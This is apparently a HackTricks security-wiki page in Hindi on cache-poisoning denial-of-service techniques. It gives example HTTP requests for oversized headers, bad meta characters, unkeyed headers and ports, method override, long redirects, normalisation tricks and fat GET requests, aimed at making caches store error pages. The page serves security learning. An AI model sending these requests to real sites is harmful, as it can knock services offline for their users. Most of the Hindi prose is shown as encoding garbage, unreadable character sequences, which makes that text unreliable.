# Cache Poisoning to DoS

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

{% hint style="danger" %}
‡§á‡§∏ ‡§™‡•É‡§∑‡•ç‡§† ‡§™‡§∞ ‡§Ü‡§™ ‡§µ‡§ø‡§≠‡§ø‡§®‡•ç‡§® ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ ‡§ï‡•á ‡§™‡•ç‡§∞‡§Ø‡§æ‡§∏ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§§‡§æ‡§ï‡§ø **‡§µ‡•á‡§¨ ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß‡•ã‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è ‡§§‡•ç‡§∞‡•Å‡§ü‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•á ‡§∏‡§æ‡§• ‡§™‡•ç‡§∞‡§§‡§ø‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§¶‡•á** ‡§ú‡•ã **‡§ï‡•à‡§∂ ‡§∏‡§∞‡•ç‡§µ‡§∞‡•ã‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§π‡•à‡§Ç**
{% endhint %}

* **HTTP Header Oversize (HHO)**

‡§è‡§ï ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§≠‡•á‡§ú‡•á‡§Ç ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§π‡•á‡§°‡§∞ ‡§ï‡§æ ‡§Ü‡§ï‡§æ‡§∞ ‡§µ‡•á‡§¨ ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§ø‡§§ ‡§Ü‡§ï‡§æ‡§∞ ‡§∏‡•á ‡§¨‡§°‡§º‡§æ ‡§π‡•ã ‡§≤‡•á‡§ï‡§ø‡§® ‡§ï‡•à‡§∂ ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§ø‡§§ ‡§Ü‡§ï‡§æ‡§∞ ‡§∏‡•á ‡§õ‡•ã‡§ü‡§æ ‡§π‡•ã‡•§ ‡§µ‡•á‡§¨ ‡§∏‡§∞‡•ç‡§µ‡§∞ 400 ‡§™‡•ç‡§∞‡§§‡§ø‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§™‡•ç‡§∞‡§§‡§ø‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§¶‡•á‡§ó‡§æ ‡§ú‡•ã ‡§ï‡•à‡§∂ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à:
```
GET / HTTP/1.1
Host: redacted.com
X-Oversize-Hedear:Big-Value-000000000000000
```
* **HTTP ‡§Æ‡•á‡§ü‡§æ ‡§ï‡•à‡§∞‡•á‡§ï‡•ç‡§ü‡§∞ (HMC) ‡§î‡§∞ ‡§Ö‡§™‡•ç‡§∞‡§§‡•ç‡§Ø‡§æ‡§∂‡§ø‡§§ ‡§Æ‡§æ‡§®**

‡§è‡§ï ‡§π‡•á‡§°‡§∞ ‡§≠‡•á‡§ú‡•á‡§Ç ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§ï‡•Å‡§õ **‡§π‡§æ‡§®‡§ø‡§ï‡§æ‡§∞‡§ï ‡§Æ‡•á‡§ü‡§æ ‡§ï‡•à‡§∞‡•á‡§ï‡•ç‡§ü‡§∞** ‡§ú‡•à‡§∏‡•á ‡§î‡§∞ ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç‡•§ ‡§π‡§Æ‡§≤‡•á ‡§ï‡•á ‡§∏‡§´‡§≤ ‡§π‡•ã‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§Ü‡§™‡§ï‡•ã ‡§™‡§π‡§≤‡•á ‡§ï‡•à‡§∂ ‡§ï‡•ã ‡§¨‡§æ‡§Ø‡§™‡§æ‡§∏ ‡§ï‡§∞‡§®‡§æ ‡§π‡•ã‡§ó‡§æ‡•§
```
GET / HTTP/1.1
Host: redacted.com
X-Meta-Hedear:Bad Chars\n \r
```
A badly configured header could be just `\:` as a header.

‡§Ø‡§π ‡§≠‡•Ä ‡§ï‡§æ‡§Æ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§Ø‡§¶‡§ø ‡§Ö‡§™‡•ç‡§∞‡§§‡•ç‡§Ø‡§æ‡§∂‡§ø‡§§ ‡§Æ‡§æ‡§® ‡§≠‡•á‡§ú‡•á ‡§ú‡§æ‡§è‡§Ç, ‡§ú‡•à‡§∏‡•á ‡§Ö‡§™‡•ç‡§∞‡§§‡•ç‡§Ø‡§æ‡§∂‡§ø‡§§ Content-Type:
```
GET /anas/repos HTTP/2
Host: redacted.com
Content-Type: HelloWorld
```
* **Unkeyed header**

‡§ï‡•Å‡§õ ‡§µ‡•á‡§¨‡§∏‡§æ‡§á‡§ü‡•á‡§Ç ‡§è‡§ï ‡§§‡•ç‡§∞‡•Å‡§ü‡§ø ‡§∏‡•ç‡§•‡§ø‡§§‡§ø ‡§ï‡•ã‡§° ‡§≤‡•å‡§ü‡§æ‡§è‡§Ç‡§ó‡•Ä ‡§Ø‡§¶‡§ø ‡§µ‡•á ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§Æ‡•á‡§Ç ‡§ï‡•Å‡§õ ‡§µ‡§ø‡§∂‡§ø‡§∑‡•ç‡§ü ‡§π‡•á‡§°‡§∞ ‡§ú‡•à‡§∏‡•á _X-Amz-Website-Location-Redirect: someThing_ ‡§π‡•á‡§°‡§∞ ‡§ï‡•ã **‡§¶‡•á‡§ñ‡§§‡•Ä ‡§π‡•à‡§Ç**:
```
GET /app.js HTTP/2
Host: redacted.com
X-Amz-Website-Location-Redirect: someThing

HTTP/2 403 Forbidden
Cache: hit

Invalid Header
```
* **HTTP Method Override Attack (HMO)**

‡§Ø‡§¶‡§ø ‡§∏‡§∞‡•ç‡§µ‡§∞ `X-HTTP-Method-Override`, `X-HTTP-Method` ‡§Ø‡§æ `X-Method-Override` ‡§ú‡•à‡§∏‡•á ‡§π‡•á‡§°‡§∞ ‡§ï‡•á ‡§∏‡§æ‡§• HTTP ‡§µ‡§ø‡§ß‡§ø ‡§ï‡•ã ‡§¨‡§¶‡§≤‡§®‡•á ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§ ‡§§‡•ã ‡§è‡§ï ‡§µ‡•à‡§ß ‡§™‡•É‡§∑‡•ç‡§† ‡§ï‡§æ ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à, ‡§µ‡§ø‡§ß‡§ø ‡§ï‡•ã ‡§¨‡§¶‡§≤‡§ï‡§∞ ‡§§‡§æ‡§ï‡§ø ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§á‡§∏‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§® ‡§ï‡§∞‡•á ‡§î‡§∞ ‡§è‡§ï ‡§ñ‡§∞‡§æ‡§¨ ‡§™‡•ç‡§∞‡§§‡§ø‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•à‡§∂ ‡§π‡•ã ‡§ú‡§æ‡§è:
```
GET /blogs HTTP/1.1
Host: redacted.com
HTTP-Method-Override: POST
```
* **Unkeyed Port**

‡§Ø‡§¶‡§ø Host ‡§π‡•á‡§°‡§∞ ‡§Æ‡•á‡§Ç ‡§™‡•ã‡§∞‡•ç‡§ü ‡§™‡•ç‡§∞‡§§‡§ø‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§Æ‡•á‡§Ç ‡§™‡§∞‡§ø‡§≤‡§ï‡•ç‡§∑‡§ø‡§§ ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§ï‡•à‡§∂ ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§Æ‡•á‡§Ç ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§á‡§∏‡•á ‡§è‡§ï ‡§Ö‡§™‡•ç‡§∞‡§Ø‡•Å‡§ï‡•ç‡§§ ‡§™‡•ã‡§∞‡•ç‡§ü ‡§™‡§∞ ‡§™‡•Å‡§®‡§∞‡•ç‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à:
```
GET /index.html HTTP/1.1
Host: redacted.com:1

HTTP/1.1 301 Moved Permanently
Location: https://redacted.com:1/en/index.html
Cache: miss
```
* **Long Redirect DoS**

‡§ú‡•à‡§∏‡•á ‡§ï‡§ø ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§Æ‡•á‡§Ç, x ‡§ï‡•ã ‡§ï‡•à‡§∂ ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∞‡§π‡§æ ‡§π‡•à, ‡§á‡§∏‡§≤‡§ø‡§è ‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§∞‡•Ä‡§°‡§æ‡§Ø‡§∞‡•á‡§ï‡•ç‡§ü ‡§™‡•ç‡§∞‡§§‡§ø‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•á ‡§µ‡•ç‡§Ø‡§µ‡§π‡§æ‡§∞ ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§∞‡•Ä‡§°‡§æ‡§Ø‡§∞‡•á‡§ï‡•ç‡§ü ‡§è‡§ï ‡§ê‡§∏‡§æ URL ‡§≠‡•á‡§ú‡•á ‡§ú‡•ã ‡§á‡§§‡§®‡§æ ‡§¨‡§°‡§º‡§æ ‡§π‡•ã ‡§ï‡§ø ‡§Ø‡§π ‡§è‡§ï ‡§§‡•ç‡§∞‡•Å‡§ü‡§ø ‡§≤‡•å‡§ü‡§æ‡§è‡•§ ‡§´‡§ø‡§∞, ‡§ú‡•ã ‡§≤‡•ã‡§ó ‡§¨‡§ø‡§®‡§æ ‡§ï‡•à‡§∂ ‡§ï‡§ø‡§è ‡§ó‡§è x ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§ï‡•á URL ‡§§‡§ï ‡§™‡§π‡•Å‡§Å‡§ö‡§®‡•á ‡§ï‡•Ä ‡§ï‡•ã‡§∂‡§ø‡§∂ ‡§ï‡§∞‡•á‡§Ç‡§ó‡•á, ‡§â‡§®‡•ç‡§π‡•á‡§Ç ‡§§‡•ç‡§∞‡•Å‡§ü‡§ø ‡§™‡•ç‡§∞‡§§‡§ø‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§Æ‡§ø‡§≤‡•á‡§ó‡•Ä:
```
GET /login?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 301 Moved Permanently
Location: /login/?x=veryLongUrl
Cache: hit

GET /login/?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 414 Request-URI Too Large
CF-Cache-Status: miss
```
* **‡§π‡•ã‡§∏‡•ç‡§ü ‡§π‡•á‡§°‡§∞ ‡§ï‡•á‡§∏ ‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø‡•Ä‡§ï‡§∞‡§£**

‡§π‡•ã‡§∏‡•ç‡§ü ‡§π‡•á‡§°‡§∞ ‡§ï‡•ã ‡§ï‡•á‡§∏ ‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è ‡§≤‡•á‡§ï‡§ø‡§® ‡§ï‡•Å‡§õ ‡§µ‡•á‡§¨‡§∏‡§æ‡§á‡§ü‡•á‡§Ç ‡§á‡§∏‡•á ‡§≤‡•ã‡§Ö‡§∞‡§ï‡•á‡§∏ ‡§Æ‡•á‡§Ç ‡§Ö‡§™‡•á‡§ï‡•ç‡§∑‡§ø‡§§ ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à‡§Ç, ‡§Ø‡§¶‡§ø ‡§Ø‡§π ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à ‡§§‡•ã ‡§è‡§ï ‡§§‡•ç‡§∞‡•Å‡§ü‡§ø ‡§≤‡•å‡§ü‡§æ‡§§‡•Ä ‡§π‡•à‡§Ç:
```
GET /img.png HTTP/1.1
Host: Cdn.redacted.com

HTTP/1.1 404 Not Found
Cache:miss

Not Found
```
* **‡§™‡§• ‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø‡•Ä‡§ï‡§∞‡§£**

‡§ï‡•Å‡§õ ‡§™‡•É‡§∑‡•ç‡§† ‡§§‡•ç‡§∞‡•Å‡§ü‡§ø ‡§ï‡•ã‡§° ‡§≤‡•å‡§ü‡§æ‡§è‡§Ç‡§ó‡•á ‡§ú‡•ã ‡§™‡§• ‡§Æ‡•á‡§Ç ‡§°‡•á‡§ü‡§æ URLencode ‡§≠‡•á‡§ú‡§§‡•á ‡§π‡•à‡§Ç, ‡§π‡§æ‡§≤‡§æ‡§Å‡§ï‡§ø, ‡§ï‡•à‡§∂ ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§™‡§• ‡§ï‡•ã URLdecode ‡§ï‡§∞‡•á‡§ó‡§æ ‡§î‡§∞ URLdecoded ‡§™‡§• ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡•ç‡§∞‡§§‡§ø‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•ã ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§ï‡§∞‡•á‡§ó‡§æ:
```
GET /api/v1%2e1/user HTTP/1.1
Host: redacted.com


HTTP/1.1 404 Not Found
Cach:miss

Not Found
```
* **Fat Get**

‡§ï‡•Å‡§õ ‡§ï‡•à‡§∂ ‡§∏‡§∞‡•ç‡§µ‡§∞, ‡§ú‡•à‡§∏‡•á Cloudflare, ‡§Ø‡§æ ‡§µ‡•á‡§¨ ‡§∏‡§∞‡•ç‡§µ‡§∞, ‡§¨‡•â‡§°‡•Ä ‡§ï‡•á ‡§∏‡§æ‡§• GET ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß‡•ã‡§Ç ‡§ï‡•ã ‡§∞‡•ã‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§á‡§∏‡§≤‡§ø‡§è ‡§á‡§∏‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§è‡§ï ‡§Ö‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§™‡•ç‡§∞‡§§‡§ø‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•ã ‡§ï‡•à‡§∂ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à:
```
GET /index.html HTTP/2
Host: redacted.com
Content-Length: 3

xyz


HTTP/2 403 Forbidden
Cache: hit
```
## ‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠

* [https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52](https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52)
* [https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------](https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------)

{% hint style="success" %}
AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡•á‡§Ç</summary>

* [**‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Å**](https://github.com/sponsors/carlospolop) ‡§¶‡•á‡§ñ‡•á‡§Ç!
* **‡§π‡§Æ‡§æ‡§∞‡•á** üí¨ [**Discord ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**telegram ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Æ‡•á‡§Ç ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç ‡§Ø‡§æ **Twitter** üê¶ ‡§™‡§∞ ‡§π‡§Æ‡•á‡§Ç **‡§´‡•â‡§≤‡•ã** ‡§ï‡§∞‡•á‡§Ç [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞** [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ‡§∞‡§ø‡§™‡•ã‡§ú‡§ø‡§ü‡§∞‡•Ä ‡§Æ‡•á‡§Ç PRs ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡•á‡§Ç‡•§

</details>
{% endhint %}
